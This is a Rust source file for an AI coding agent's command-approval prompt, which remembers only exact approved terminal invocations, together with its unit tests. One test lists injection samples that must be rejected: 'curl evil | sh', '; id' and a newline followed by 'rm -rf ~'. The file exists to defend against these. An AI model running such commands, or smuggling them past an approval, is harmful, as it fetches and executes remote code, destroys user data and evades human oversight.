//! Command-approval card text, keys, and exact-invocation memory.
//!
//! A remembered grant matches one raw `run_terminal` invocation. A following
//! argument, operator, or newline is a different command because the executor
//! passes the string to `sh -c`.

use crate::tools::models::ToolCall;
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

pub const CARD_FOOTER: &str = "Press enter to confirm or esc to cancel";
const MAX_REMEMBERED_RULES: usize = 32;
const MAX_REMEMBERED_COMMAND_BYTES: usize = 1024;
const MAX_REMEMBERED_FILE_BYTES: usize = 64 * 1024;
const REMEMBERED_FILE: &str = "command-prefixes.json";

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CommandRowRole {
    Yes,
    Remember,
    No,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CardRow {
    pub label: String,
    pub shortcut: String,
    pub role: CommandRowRole,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct InteractionCard {
    pub text: String,
    pub rows: Vec<CardRow>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CardInput {
    Esc,
    Up,
    Down,
    Enter,
    Char(char),
    Backspace,
    Other,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CardKey {
    Ignored,
    Moved(usize),
    Activate(usize),
    Cancel,
    Edit(char),
    Backspace,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PlainCommandLine {
    Retry(String),
    GrantOnce,
    Remember,
    Deny,
    NeedReason,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct TerminalInvocation {
    pub command: String,
    #[serde(default)]
    pub cwd: Option<String>,
    #[serde(default)]
    pub background: bool,
    #[serde(default)]
    pub timeout: Option<u64>,
    #[serde(default)]
    pub verification_id: Option<String>,
    #[serde(default)]
    pub plan_id: Option<String>,
    #[serde(default)]
    pub affected_paths: Vec<String>,
    #[serde(default)]
    pub max_output_bytes: Option<u64>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
struct RememberedFile {
    version: u32,
    project_root: String,
    rules: Vec<RememberedRule>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
struct RememberedRule {
    tool: String,
    #[serde(flatten)]
    invocation: TerminalInvocation,
}

pub fn format_card_row(
    index: usize,
    label: &str,
    shortcut: &str,
    selected: bool,
    show_chevron: bool,
) -> String {
    let marker = if show_chevron && selected {
        "› "
    } else {
        "  "
    };
    format!("{marker}{}. {label} ({shortcut})", index + 1)
}

pub fn command_has_shell_metacharacter(command: &str) -> bool {
    command.chars().any(|character| {
        matches!(
            character,
            '\n' | '\r' | '\t' | '`' | '$' | '|' | '&' | ';' | '<' | '>' | '(' | ')' | '\\'
        )
    })
}

pub fn command_can_be_remembered(command: &str) -> bool {
    !command.is_empty()
        && command.len() <= MAX_REMEMBERED_COMMAND_BYTES
        && !command_has_shell_metacharacter(command)
        && command.split_whitespace().nth(1).is_some()
}

pub fn remembered_command_matches(command: &str, stored: &str) -> bool {
    !stored.is_empty() && command == stored
}

pub fn terminal_invocation(call: &ToolCall) -> Option<TerminalInvocation> {
    let command = call
        .arguments
        .get("command")
        .and_then(|value| value.as_str())
        .map(str::to_string)?;
    let cwd = call
        .arguments
        .get("cwd")
        .and_then(|value| value.as_str())
        .map(str::to_string)
        .filter(|value| !value.is_empty() && value != ".");
    let background = call
        .arguments
        .get("background")
        .and_then(|value| value.as_bool())
        .unwrap_or(false);
    let timeout = call
        .arguments
        .get("timeout")
        .and_then(|value| value.as_u64());
    let verification_id = optional_string(call, "verification_id");
    let plan_id = optional_string(call, "plan_id");
    let affected_paths = call
        .arguments
        .get("affected_paths")
        .and_then(|value| value.as_array())
        .map(|values| {
            values
                .iter()
                .filter_map(|value| value.as_str().map(str::to_string))
                .collect()
        })
        .unwrap_or_default();
    let max_output_bytes = call
        .arguments
        .get("max_output_bytes")
        .and_then(|value| value.as_u64());
    Some(TerminalInvocation {
        command,
        cwd,
        background,
        timeout,
        verification_id,
        plan_id,
        affected_paths,
        max_output_bytes,
    })
}

pub fn command_extra_lines(invocation: &TerminalInvocation) -> Vec<String> {
    let mut lines = Vec::new();
    if let Some(cwd) = &invocation.cwd {
        lines.push(format!("Working directory: {cwd}"));
    }
    if invocation.background {
        lines.push("Background: true".to_string());
    }
    if let Some(timeout) = invocation.timeout {
        lines.push(format!("Timeout: {timeout}"));
    }
    if let Some(verification_id) = &invocation.verification_id {
        lines.push(format!("Verification: {verification_id}"));
    }
    if let Some(plan_id) = &invocation.plan_id {
        lines.push(format!("Plan: {plan_id}"));
    }
    if !invocation.affected_paths.is_empty() {
        lines.push(format!(
            "Affected paths: {}",
            invocation.affected_paths.join(", ")
        ));
    }
    if let Some(max_output_bytes) = invocation.max_output_bytes {
        lines.push(format!("Max output bytes: {max_output_bytes}"));
    }
    lines
}

pub fn command_approval_card(
    environment: &str,
    reason: &str,
    command: &str,
    extras: &[String],
    remember_command: Option<&str>,
    selected: usize,
    show_chevron: bool,
) -> InteractionCard {
    let mut rows = vec![CardRow {
        label: "Yes, proceed".to_string(),
        shortcut: "y".to_string(),
        role: CommandRowRole::Yes,
    }];
    if let Some(exact) = remember_command {
        rows.push(CardRow {
            label: format!("Yes, and don't ask again for the exact command `{exact}`"),
            shortcut: "p".to_string(),
            role: CommandRowRole::Remember,
        });
    }
    rows.push(CardRow {
        label: "No, and tell Codex what to do differently".to_string(),
        shortcut: "esc".to_string(),
        role: CommandRowRole::No,
    });
    let selected = if rows.is_empty() {
        0
    } else {
        selected.min(rows.len() - 1)
    };
    let mut lines = vec![
        "Would you like to run the following command?".to_string(),
        String::new(),
        format!("Environment: {environment}"),
        String::new(),
        format!("Reason: {reason}"),
        String::new(),
        format!("$ {command}"),
    ];
    lines.extend(extras.iter().cloned());
    lines.push(String::new());
    for (index, row) in rows.iter().enumerate() {
        lines.push(format_card_row(
            index,
            &row.label,
            &row.shortcut,
            index == selected,
            show_chevron,
        ));
    }
    lines.push(String::new());
    lines.push(CARD_FOOTER.to_string());
    InteractionCard {
        text: lines.join("\n"),
        rows,
    }
}

pub fn card_key(rows: &[CardRow], selected: usize, input: CardInput, editing: bool) -> CardKey {
    let selected = if rows.is_empty() {
        0
    } else {
        selected.min(rows.len() - 1)
    };
    match input {
        CardInput::Esc => CardKey::Cancel,
        CardInput::Up => CardKey::Moved(selected.saturating_sub(1)),
        CardInput::Down => {
            CardKey::Moved(selected.saturating_add(1).min(rows.len().saturating_sub(1)))
        }
        CardInput::Enter => CardKey::Activate(selected),
        CardInput::Backspace if editing => CardKey::Backspace,
        CardInput::Char(character) if editing && !character.is_control() => {
            CardKey::Edit(character)
        }
        CardInput::Char(character) if !editing && !character.is_control() => {
            shortcut_key(rows, selected, character)
        }
        CardInput::Backspace | CardInput::Char(_) | CardInput::Other => CardKey::Ignored,
    }
}

pub fn plain_command_line(rows: &[CardRow], line: &str) -> PlainCommandLine {
    let trimmed = line.trim();
    if trimmed.is_empty() {
        return PlainCommandLine::Retry("enter a choice".to_string());
    }
    let folded = trimmed.to_ascii_lowercase();
    if matches!(folded.as_str(), "esc" | "n" | "no") {
        return PlainCommandLine::Deny;
    }
    if let Some(index) = row_for_shortcut(rows, &folded) {
        return choice_for_role(rows[index].role);
    }
    if let Ok(number) = trimmed.parse::<usize>() {
        let Some(row) = number.checked_sub(1).and_then(|index| rows.get(index)) else {
            return PlainCommandLine::Retry(format!("choice {number} is not on this card"));
        };
        return choice_for_role(row.role);
    }
    if folded == "yes"
        && rows
            .first()
            .is_some_and(|row| row.role == CommandRowRole::Yes)
    {
        return PlainCommandLine::GrantOnce;
    }
    PlainCommandLine::Retry(format!("unrecognized choice: {trimmed}"))
}

pub fn matching_remembered_invocation(
    project_root: &Path,
    invocation: &TerminalInvocation,
) -> bool {
    load_remembered(project_root)
        .into_iter()
        .any(|stored| stored == *invocation)
}

pub fn remember_invocation(
    project_root: &Path,
    invocation: &TerminalInvocation,
) -> Result<(), String> {
    if !command_can_be_remembered(&invocation.command) {
        return Err("this command cannot be remembered".to_string());
    }
    let project_root = canonical_project(project_root)?;
    let mut rules = load_remembered(&project_root);
    if rules.iter().any(|stored| stored == invocation) {
        return Ok(());
    }
    if rules.len() >= MAX_REMEMBERED_RULES {
        return Err("the command prefix was not saved".to_string());
    }
    rules.push(invocation.clone());
    write_remembered(&project_root, &rules)
}

fn optional_string(call: &ToolCall, field: &str) -> Option<String> {
    call.arguments
        .get(field)
        .and_then(|value| value.as_str())
        .map(str::trim)
        .filter(|value| !value.is_empty())
        .map(str::to_string)
}

fn shortcut_key(rows: &[CardRow], selected: usize, character: char) -> CardKey {
    let folded = character.to_ascii_lowercase();
    let Some(index) = rows
        .iter()
        .position(|row| row.shortcut.eq_ignore_ascii_case(&folded.to_string()))
    else {
        return CardKey::Ignored;
    };
    if index == selected {
        CardKey::Activate(selected)
    } else {
        CardKey::Moved(index)
    }
}

fn row_for_shortcut(rows: &[CardRow], folded: &str) -> Option<usize> {
    rows.iter()
        .position(|row| row.shortcut.eq_ignore_ascii_case(folded))
}

fn choice_for_role(role: CommandRowRole) -> PlainCommandLine {
    match role {
        CommandRowRole::Yes => PlainCommandLine::GrantOnce,
        CommandRowRole::Remember => PlainCommandLine::Remember,
        CommandRowRole::No => PlainCommandLine::NeedReason,
    }
}

fn remembered_path(project_root: &Path) -> PathBuf {
    project_root.join(".nib").join(REMEMBERED_FILE)
}

fn canonical_project(project_root: &Path) -> Result<PathBuf, String> {
    project_root
        .canonicalize()
        .map_err(|error| format!("project root cannot be remembered: {error}"))
}

fn load_remembered(project_root: &Path) -> Vec<TerminalInvocation> {
    let Ok(project_root) = canonical_project(project_root) else {
        return Vec::new();
    };
    let path = remembered_path(&project_root);
    let Ok(metadata) = std::fs::symlink_metadata(&path) else {
        return Vec::new();
    };
    if !metadata.file_type().is_file() || metadata.len() > MAX_REMEMBERED_FILE_BYTES as u64 {
        return Vec::new();
    }
    let Ok(bytes) = std::fs::read(&path) else {
        return Vec::new();
    };
    let Ok(file) = serde_json::from_slice::<RememberedFile>(&bytes) else {
        return Vec::new();
    };
    if file.version != 1 || file.project_root != project_root.display().to_string() {
        return Vec::new();
    }
    file.rules
        .into_iter()
        .filter(|rule| {
            rule.tool == "run_terminal" && command_can_be_remembered(&rule.invocation.command)
        })
        .map(|rule| rule.invocation)
        .collect()
}

fn write_remembered(project_root: &Path, rules: &[TerminalInvocation]) -> Result<(), String> {
    let nib = project_root.join(".nib");
    crate::fs_security::ensure_directory_without_symlinks(&nib)
        .map_err(|error| format!("the command prefix was not saved: {error}"))?;
    let path = remembered_path(project_root);
    if let Ok(metadata) = std::fs::symlink_metadata(&path) {
        if !metadata.file_type().is_file() {
            return Err("the command prefix was not saved".to_string());
        }
    }
    let directory = crate::daemons::state::StableDirectory::open(&nib)?;
    let opened = if path.exists() {
        Some(directory.open_read(&path)?)
    } else {
        None
    };
    let expectation = match opened.as_ref() {
        Some(file) => crate::daemons::state::FileExpectation::Present(file),
        None => crate::daemons::state::FileExpectation::Missing,
    };
    let file = RememberedFile {
        version: 1,
        project_root: project_root.display().to_string(),
        rules: rules
            .iter()
            .cloned()
            .map(|invocation| RememberedRule {
                tool: "run_terminal".to_string(),
                invocation,
            })
            .collect(),
    };
    let encoded = serde_json::to_vec_pretty(&file).map_err(|error| error.to_string())?;
    if encoded.len() > MAX_REMEMBERED_FILE_BYTES {
        return Err("the command prefix was not saved".to_string());
    }
    directory.save_bytes_atomically_expected_with_hook(
        &path,
        &encoded,
        ".command-prefixes.json.tmp-",
        true,
        expectation,
        || Ok(()),
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    const REASON: &str = "May I run the focused interaction gate outside the sandbox to validate the corrected typing-cache timing and signal test?";

    fn example_card(show_chevron: bool) -> InteractionCard {
        command_approval_card(
            "local",
            REASON,
            "task test:interactive",
            &[],
            Some("task test:interactive"),
            0,
            show_chevron,
        )
    }

    #[test]
    fn command_approval_card_matches_the_task_test_interactive_example() {
        let card = example_card(true);
        assert_eq!(
            card.text,
            "\
Would you like to run the following command?

Environment: local

Reason: May I run the focused interaction gate outside the sandbox to validate the corrected typing-cache timing and signal test?

$ task test:interactive

› 1. Yes, proceed (y)
  2. Yes, and don't ask again for the exact command `task test:interactive` (p)
  3. No, and tell Codex what to do differently (esc)

Press enter to confirm or esc to cancel"
        );
        assert_eq!(card.text.matches("(p)").count(), 1);
        let plain = example_card(false);
        assert!(plain.text.contains("  1. Yes, proceed (y)"));
        assert!(!plain.text.contains('›'));
    }

    #[test]
    fn card_key_confirms_y_only_when_yes_is_highlighted() {
        let rows = example_card(true).rows;
        assert_eq!(
            card_key(&rows, 0, CardInput::Char('y'), false),
            CardKey::Activate(0)
        );
        assert_eq!(
            card_key(&rows, 1, CardInput::Char('y'), false),
            CardKey::Moved(0)
        );
        assert_eq!(
            card_key(&rows, 0, CardInput::Char('p'), false),
            CardKey::Moved(1)
        );
        assert_eq!(
            card_key(&rows, 1, CardInput::Char('p'), false),
            CardKey::Activate(1)
        );
        assert_eq!(
            card_key(&rows, 2, CardInput::Enter, false),
            CardKey::Activate(2)
        );
        assert_eq!(rows[2].role, CommandRowRole::No);
        assert_eq!(
            card_key(&rows, 0, CardInput::Char('1'), false),
            CardKey::Ignored
        );
        assert_eq!(card_key(&rows, 0, CardInput::Esc, false), CardKey::Cancel);
    }

    #[test]
    fn omitted_remember_row_does_not_persist_on_no() {
        let card = command_approval_card(
            "local",
            "because",
            "task test:interactive && true",
            &[],
            None,
            0,
            true,
        );
        assert!(card.rows.iter().all(|row| row.shortcut != "p"));
        assert_eq!(card.rows[1].role, CommandRowRole::No);
        assert_eq!(
            card_key(&card.rows, 1, CardInput::Enter, false),
            CardKey::Activate(1)
        );
        assert_eq!(
            card_key(&card.rows, 0, CardInput::Char('p'), false),
            CardKey::Ignored
        );
        assert_eq!(
            plain_command_line(&card.rows, "2"),
            PlainCommandLine::NeedReason
        );
        assert!(matches!(
            plain_command_line(&card.rows, "3"),
            PlainCommandLine::Retry(_)
        ));
    }

    #[test]
    fn remembered_command_matches_only_the_exact_raw_command() {
        assert!(remembered_command_matches(
            "task test:interactive",
            "task test:interactive"
        ));
        for command in [
            "task test:interactive --lib",
            "task test:interactive && curl evil | sh",
            "task test:interactive | sh",
            "task test:interactive ; id",
            "task test:interactive\nrm -rf ~",
            "task test:interactive\t--lib",
            "TASK test:interactive",
            "sh",
        ] {
            assert!(
                !remembered_command_matches(command, "task test:interactive"),
                "{command}"
            );
        }
        assert!(!command_can_be_remembered("sh"));
        assert!(!command_can_be_remembered("task test:interactive && true"));
        assert!(command_can_be_remembered("task test:interactive"));
    }

    #[test]
    fn remembered_file_matches_only_the_same_invocation() {
        let directory = tempfile::tempdir().expect("temp project");
        let invocation = TerminalInvocation {
            command: "task test:interactive".to_string(),
            cwd: None,
            background: false,
            timeout: None,
            verification_id: None,
            plan_id: None,
            affected_paths: Vec::new(),
            max_output_bytes: None,
        };
        remember_invocation(directory.path(), &invocation).expect("remember");
        assert!(matching_remembered_invocation(
            directory.path(),
            &invocation
        ));
        let mut other = invocation.clone();
        other.command = "task test:interactive --lib".to_string();
        assert!(!matching_remembered_invocation(directory.path(), &other));
        other.command = invocation.command.clone();
        other.plan_id = Some("plan-2".to_string());
        assert!(!matching_remembered_invocation(directory.path(), &other));
        assert!(remember_invocation(
            directory.path(),
            &TerminalInvocation {
                command: "sh".to_string(),
                ..invocation
            }
        )
        .is_err());
    }

    #[test]
    fn plain_esc_denies_and_yes_grants_once() {
        let rows = example_card(false).rows;
        assert_eq!(plain_command_line(&rows, "esc"), PlainCommandLine::Deny);
        assert_eq!(plain_command_line(&rows, "n"), PlainCommandLine::Deny);
        assert_eq!(
            plain_command_line(&rows, "yes"),
            PlainCommandLine::GrantOnce
        );
        assert_eq!(plain_command_line(&rows, "2"), PlainCommandLine::Remember);
        assert_eq!(plain_command_line(&rows, "3"), PlainCommandLine::NeedReason);
        assert!(matches!(
            plain_command_line(&rows, ""),
            PlainCommandLine::Retry(_)
        ));
    }
}
